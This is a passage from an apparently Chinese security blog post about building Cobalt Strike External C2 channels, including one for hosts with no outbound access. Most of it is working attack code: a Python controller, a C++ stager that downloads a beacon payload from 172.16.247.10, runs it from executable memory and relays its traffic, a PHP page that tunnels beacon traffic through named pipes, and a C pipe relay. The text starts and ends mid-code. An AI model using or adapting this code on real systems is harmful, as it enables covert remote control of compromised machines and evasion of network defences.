class="built_in">print</span> <span class="string">&quot;Sending %d bytes to beacon&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line">            <span class="variable language_">self</span>.sendToBeacon(data)</span><br><span class="line"></span><br><span class="line">            data = <span class="variable language_">self</span>.recvFromBeacon()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Received %d bytes from beacon&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Sending %d bytes to TS&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line">            <span class="variable language_">self</span>.sendToTS(data)</span><br><span class="line"></span><br><span class="line">            data = <span class="variable language_">self</span>.recvFromTS()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Received %d bytes from TS&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">controller = ExternalC2Controller(<span class="number">2222</span>)</span><br><span class="line">controller.run()</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : This file contains the &#x27;main&#x27; function. Program execution begins and ends there.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ShellAPI.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Shlobj.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;user32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Advapi32.lib&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Shell32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">spawnBeacon</span><span class="params">(<span class="type">char</span> *payload, DWORD len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	HANDLE threadHandle;</span><br><span class="line">	DWORD threadId = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> *alloc = (<span class="type">char</span> *)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(alloc, payload, len);</span><br><span class="line"></span><br><span class="line">	threadHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)alloc, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sends data to our C2 controller received from our injected beacon</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sendData</span><span class="params">(SOCKET sd, <span class="type">const</span> <span class="type">char</span> *data, DWORD len)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> *buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*(DWORD *)buffer = len;</span><br><span class="line">	<span class="built_in">memcpy</span>(buffer + <span class="number">4</span>, data, len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; len + <span class="number">4</span>) &#123;</span><br><span class="line">		bytesWritten = <span class="built_in">send</span>(sd, buffer + totalLen, len + <span class="number">4</span> - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesWritten;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Receives data from our C2 controller to be relayed to the injected beacon</span></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">recvData</span><span class="params">(SOCKET sd, DWORD *len)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	DWORD bytesReceived = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">recv</span>(sd, (<span class="type">char</span> *)len, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">	buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(*len);</span><br><span class="line">	<span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">		bytesReceived = <span class="built_in">recv</span>(sd, buffer + totalLen, *len - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesReceived;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creates a new C2 controller connection for relaying commands</span></span><br><span class="line"><span class="function">SOCKET <span class="title">createC2Socket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *addr, WORD port)</span> </span>&#123;</span><br><span class="line">	WSADATA wsd;</span><br><span class="line">	SOCKET sd;</span><br><span class="line">	SOCKADDR_IN sin;</span><br><span class="line">	<span class="built_in">WSAStartup</span>(<span class="number">0x0202</span>, &amp;wsd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sin, <span class="number">0</span>, <span class="built_in">sizeof</span>(sin));</span><br><span class="line">	sin.sin_family = AF_INET;</span><br><span class="line">	sin.sin_port = <span class="built_in">htons</span>(port);</span><br><span class="line">	sin.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(addr);</span><br><span class="line"></span><br><span class="line">	sd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line">	<span class="built_in">connect</span>(sd, (SOCKADDR*)&amp;sin, <span class="built_in">sizeof</span>(sin));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connects to the name pipe spawned by the injected beacon</span></span><br><span class="line"><span class="function">HANDLE <span class="title">connectBeaconPipe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pipeName)</span> </span>&#123;</span><br><span class="line">	HANDLE beaconPipe;</span><br><span class="line"></span><br><span class="line">	beaconPipe = <span class="built_in">CreateFileA</span>(pipeName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> beaconPipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Receives data from our injected beacon via a named pipe</span></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">recvFromBeacon</span><span class="params">(HANDLE pipe, DWORD *len)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	DWORD bytesRead = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">ReadFile</span>(pipe, len, <span class="number">4</span>, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">	buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(*len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">		<span class="built_in">ReadFile</span>(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">		totalLen += bytesRead;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write data to our injected beacon via a named pipe</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sendToBeacon</span><span class="params">(HANDLE pipe, <span class="type">const</span> <span class="type">char</span> *data, DWORD len)</span> </span>&#123;</span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">WriteFile</span>(pipe, &amp;len, <span class="number">4</span>, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WriteFile</span>(pipe, data, len, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD payloadLen = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> *payloadData = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE beaconPipe = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Create a connection back to our C2 controller</span></span><br><span class="line">	SOCKET c2socket = <span class="built_in">createC2Socket</span>(<span class="string">&quot;172.16.247.10&quot;</span>, <span class="number">8081</span>);</span><br><span class="line">	payloadData = <span class="built_in">recvData</span>(c2socket, &amp;payloadLen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Start the CS beacon</span></span><br><span class="line">	<span class="built_in">spawnBeacon</span>(payloadData, payloadLen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop until the pipe is up and ready to use</span></span><br><span class="line">	<span class="keyword">while</span> (beaconPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="comment">// Create our IPC pipe for talking to the C2 beacon</span></span><br><span class="line">		<span class="built_in">Sleep</span>(<span class="number">500</span>);</span><br><span class="line">		beaconPipe = <span class="built_in">connectBeaconPipe</span>(<span class="string">&quot;\\\\.\\pipe\\xpntest&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="comment">// Start the pipe dance</span></span><br><span class="line">		payloadData = <span class="built_in">recvFromBeacon</span>(beaconPipe, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">sendData</span>(c2socket, payloadData, payloadLen);</span><br><span class="line">		<span class="built_in">free</span>(payloadData);</span><br><span class="line"></span><br><span class="line">		payloadData = <span class="built_in">recvData</span>(c2socket, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">sendToBeacon</span>(beaconPipe, payloadData, payloadLen);</span><br><span class="line">		<span class="built_in">free</span>(payloadData);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="./1571643137567.png" alt="Alt text"><br>
<img src="./1571643153157.png" alt="Alt text"><br>
<img src="./1571643183702.png" alt="Alt text"></p>
<h2 id="用External-C2-解决不出网的问题">用External C2 解决不出网的问题</h2>
<p>这种情况使用client.php client.exe smb-beacon.exe作为一个通信链路。其运作方式是，client.exe打开管道smb-beacon.exe创建的<code>beacon</code>管道，读出数据写入client.exe创建的<code>clientread</code>管道，client.php打开<code>clientread</code>管道将数据传回第三方控制器。client.php将第三方控制器传入来的数据写入client.exe创建的<code>clientwrite</code>管道中，client.exe再读取<code>clientwrite</code>管道中的数据写入<code>beacon</code>管道。</p>
<p>client.exe在整个流程中扮演数据中继的角色，<strong>之所以需要client.exe做中继的本质原因是对于smb beacon来说每打开一次（fopen）相当于就是建立一个新的对话，而php没法对文件句柄持久化，如果用php直接操作<code>beacon</code>每次请求php都相当于一次另起炉灶，根本没有办法建立进行通信。所以client.exe对beacon句柄做持久化</strong>。</p>
<p>以下是demo代码，基本抄袭自<a href="https://github.com/hl0rey/Web_ExternalC2_Demo">hl0rey师傅的项目</a>，代码中继管道的cpp代码只能在win10上跑，win7上跑不了，暂不清楚原因。</p>
<p>控制器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExternalC2Controller</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, port</span>):</span><br><span class="line">        <span class="variable language_">self</span>.port = port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeFrame</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">len</span>(data)) + data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendToTS</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Send To Ts &quot;</span> + <span class="variable language_">self</span>.encodeFrame(data)</span><br><span class="line">        <span class="variable language_">self</span>._socketTS.sendall(<span class="variable language_">self</span>.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvFromTS</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        _<span class="built_in">len</span> =  <span class="variable language_">self</span>._socketTS.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>,_<span class="built_in">len</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(data) &lt; l:</span><br><span class="line">            data += <span class="variable language_">self</span>._socketTS.recv(l - <span class="built_in">len</span>(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendToBeacon</span>(<span class="params">self, data</span>):</span><br><span class="line">        params[<span class="string">&#x27;action&#x27;</span>] = <span class="string">&quot;write&quot;</span></span><br><span class="line">        params[<span class="string">&#x27;pipename&#x27;</span>] = <span class="string">&quot;hlwrite&quot;</span></span><br><span class="line">        params[<span class="string">&#x27;data&#x27;</span>] = <span class="variable language_">self</span>.encodeFrame(data)</span><br><span class="line">        resp = requests.post(url=URL, data=params, timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Write Content: &quot;</span> + resp.text</span><br><span class="line">        params[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvFromBeacon</span>(<span class="params">self</span>):</span><br><span class="line">        params[<span class="string">&#x27;action&#x27;</span>] = <span class="string">&quot;read&quot;</span></span><br><span class="line">        params[<span class="string">&#x27;pipename&#x27;</span>] = <span class="string">&quot;hlread&quot;</span></span><br><span class="line">        resp = requests.get(url=URL, params=params, timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Read Content: &quot;</span> + resp.text</span><br><span class="line">        <span class="keyword">return</span> resp.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        <span class="variable language_">self</span>._socketTS.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="variable language_">self</span>.port))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;arch=x64&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;pipename=xpntest&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;block=500&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;go&quot;</span>)</span><br><span class="line"></span><br><span class="line">        data = <span class="variable language_">self</span>.recvFromTS()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            data = <span class="variable language_">self</span>.recvFromBeacon()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Received %d bytes from beacon&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Sending %d bytes to TS&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line">            <span class="variable language_">self</span>.sendToTS(data)</span><br><span class="line"></span><br><span class="line">            data = <span class="variable language_">self</span>.recvFromTS()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Received %d bytes from TS&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Sending %d bytes to beacon&quot;</span> % <span class="built_in">len</span>(data)</span><br><span class="line">            <span class="variable language_">self</span>.sendToBeacon(data)</span><br><span class="line">            </span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line"><span class="comment">#URL = &quot;http://172.16.247.145/pipe.php&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://172.16.247.145/index.php&quot;</span></span><br><span class="line">params = &#123;<span class="string">&quot;pipename&quot;</span>:<span class="string">&quot;xpntest&quot;</span>, <span class="string">&quot;action&quot;</span>:<span class="string">&quot;&quot;</span>, <span class="string">&quot;data&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">controller = ExternalC2Controller(<span class="number">2222</span>)</span><br><span class="line">controller.run()</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">recvFromBeacon</span>(<span class="params"><span class="variable">$pipename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$pipename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        <span class="variable">$len</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$len</span>=<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;v&quot;</span>, <span class="variable">$len</span>)[<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$data</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="variable">$len</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sendToBeacon</span>(<span class="params"><span class="variable">$pipename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$pipename</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pipename&#x27;</span>])&#123;</span><br><span class="line">        <span class="variable">$pipename</span> = <span class="string">&#x27;\\\\.\\pipe\\&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pipename&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&#x27;read&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">recvFromBeacon</span>(<span class="variable">$pipename</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&#x27;write&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">sendToBeacon</span>(<span class="variable">$pipename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 Not Found&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>中继代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAYLOAD_MAX_SIZE 512 * 1024</span><br><span class="line">#define BUFFER_MAX_SIZE 1024 * 1024</span><br><span class="line"></span><br><span class="line">//桥，字面意思。方便把自定义的管道和beacon管道桥接的结构体</span><br><span class="line">struct BRIDGE</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE client;</span><br><span class="line">	HANDLE server;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//从beacon读取数据</span><br><span class="line">DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) &#123;</span><br><span class="line"></span><br><span class="line">	DWORD size = 0, temp = 0, total = 0;</span><br><span class="line">	/* read the 4-byte length */</span><br><span class="line">	ReadFile(my_handle, (char*)&amp; size, 4, &amp;temp, NULL);</span><br><span class="line">	printf(&quot;read_frame length: %d\n&quot;, size);</span><br><span class="line">	/* read the whole thing in */</span><br><span class="line">	while (total &lt; size) &#123;</span><br><span class="line">		ReadFile(my_handle, buffer + total, size - total, &amp;temp,</span><br><span class="line">			NULL);</span><br><span class="line">		total += temp;</span><br><span class="line">	&#125;</span><br><span class="line">	return size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//向beacon写入数据</span><br><span class="line">void write_frame(HANDLE my_handle, char* buffer, DWORD length) &#123;</span><br><span class="line">	printf(&quot;write_frame length: %d\n&quot;, length);</span><br><span class="line">	DWORD wrote = 0;</span><br><span class="line">	WriteFile(my_handle, (void*)&amp; length, 4, &amp;wrote, NULL);</span><br><span class="line">	printf(&quot;write %d bytes.\n&quot;, wrote);</span><br><span class="line">	WriteFile(my_handle, buffer, length, &amp;wrote, NULL);</span><br><span class="line">	printf(&quot;write %d bytes.\n&quot;, wrote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//从控制器读取数据</span><br><span class="line">DWORD read_client(HANDLE my_handle, char* buffer) &#123;</span><br><span class="line">	DWORD size = 0;</span><br><span class="line">	DWORD readed = 0;</span><br><span class="line">	ReadFile(my_handle, &amp;size, 4, NULL, NULL);</span><br><span class="line">	printf(&quot;read_client length: %d\n&quot;, size);</span><br><span class="line">	ReadFile(my_handle, buffer, size, &amp;readed, NULL);</span><br><span class="line">	printf(&quot;final data from client: %d\n&quot;, readed);</span><br><span class="line">	return readed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//向控制器写入数据</span><br><span class="line">void write_client(HANDLE my_handle, char* buffer, DWORD length) &#123;</span><br><span class="line">	DWORD wrote = 0;</span><br><span class="line">	WriteFile(my_handle, buffer, length, &amp;wrote, NULL);</span><br><span class="line">	printf(&quot;write client total %d data %d\n&quot;, wrote, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//客户端读管道、服务端写管道逻辑</span><br><span class="line">DWORD WINAPI ReadOnlyPipeProcess(LPVOID lpvParam) &#123;</span><br><span class="line">	//把两条管道的句柄取出来</span><br><span class="line">	struct BRIDGE* bridge = (struct BRIDGE*)lpvParam;</span><br><span class="line">	HANDLE hpipe = bridge-&gt;client;</span><br><span class="line">	HANDLE beacon = bridge-&gt;server;</span><br><span class="line">	</span><br><span class="line">	DWORD length = 0;</span><br><span class="line">	char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	if (buffer == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	//再次校验管道</span><br><span class="line">	if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))</span><br><span class="line">	&#123;</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	while (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		if (ConnectNamedPipe(hpipe, NULL))</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;client want read.\n&quot;);</span><br><span class="line">			length = read_frame(beacon, buffer, BUFFER_MAX_SIZE);</span><br><span class="line">			printf(&quot;read from beacon: %d\n&quot;, length);</span><br><span class="line">			//分两次传送，发一次长度，再发数据。</span><br><span class="line">			write_client(hpipe,(char *) &amp;length, 4);</span><br><span class="line">			FlushFileBuffers(hpipe);</span><br><span class="line">			write_client(hpipe, buffer, length);</span><br><span class="line">			FlushFileBuffers(hpipe);</span><br><span class="line">			DisconnectNamedPipe(hpipe);</span><br><span class="line">			//清空缓存区</span><br><span class="line">			ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">			length = 0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//客户端写管道、服务端读管道逻辑</span><br><span class="line">DWORD WINAPI WriteOnlyPipeProcess(LPVOID lpvParam) &#123;</span><br><span class="line">	//取出两条管道</span><br><span class="line">	struct BRIDGE* bridge = (struct BRIDGE*)lpvParam;</span><br><span class="line">	HANDLE hpipe = bridge-&gt;client;</span><br><span class="line">	HANDLE beacon = bridge-&gt;server;</span><br><span class="line">	</span><br><span class="line">	DWORD length = 0;</span><br><span class="line">	char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	if (buffer == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))</span><br><span class="line">	&#123;</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	while (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		if (ConnectNamedPipe(hpipe, NULL))</span><br><span class="line">		&#123;</span><br><span class="line">			//一次性读，一次性写</span><br><span class="line">			printf(&quot;client want write.\n&quot;);</span><br><span class="line">			length = read_client(hpipe, buffer);</span><br><span class="line">			printf(&quot;read from client: %d\n&quot;, length);</span><br><span class="line">			write_frame(beacon, buffer, length);</span><br><span class="line">			DisconnectNamedPipe(hpipe);</span><br><span class="line">			//清空缓存区</span><br><span class="line">			ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">			length = 0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line"></span><br><span class="line">	//创建客户端读管道</span><br><span class="line">	HANDLE hPipeRead = CreateNamedPipe(&quot;\\\\.\\pipe\\hlread&quot;, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL);</span><br><span class="line">	//创建客户端写管道</span><br><span class="line">	HANDLE hPipeWrite = CreateNamedPipe(&quot;\\\\.\\pipe\\hlwrite&quot;, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL);</span><br><span class="line">	//与beacon建立连接</span><br><span class="line">	HANDLE hfileServer = CreateFileA(&quot;\\\\.\\pipe\\hltest&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, 